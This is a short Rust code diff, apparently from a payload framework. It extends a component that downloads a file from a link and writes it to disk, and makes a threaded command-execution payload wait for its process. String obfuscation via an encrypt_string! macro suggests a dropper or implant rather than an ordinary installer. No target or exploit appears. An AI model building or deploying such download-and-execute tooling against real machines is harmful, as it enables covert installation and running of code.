@@ -286,6 +286,7 @@ pub fn basename(out_filepath: &String) -> String {
 pub struct WriteFile {
     pub link: Link,
     pub path: String,
+    pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
     //pub out_overwrite: bool,
     //random name... mais il faut trouver un moyen pour passer la value aux payloads suivantes.
 }
@@ -297,6 +298,8 @@ use shellexpand;
 
 impl WriteFile {
     pub fn download_file(&self) -> Result<PayloadExec, anyhow::Error> {
+        //TODO verify if file already exist and calculate hash before replacing it.
+        
         let body: Vec<u8> = self.link.fetch_data()?;
         //let data_write_path = self.write_file(body)?;
         //TODO calculate the PATH, create
@@ -354,8 +357,9 @@ impl Exec {
         }
         if self.thread {
             let tj: thread::JoinHandle<()> = thread::spawn(move || {
-                comm.spawn()
+                let mut c=comm.spawn()
                     .expect(&encrypt_string!("failed to execute process"));
+                let _ = c.wait();
             });
             return Ok(PayloadExec::Thread(tj, Payload::Exec(self.clone())));
         } else {
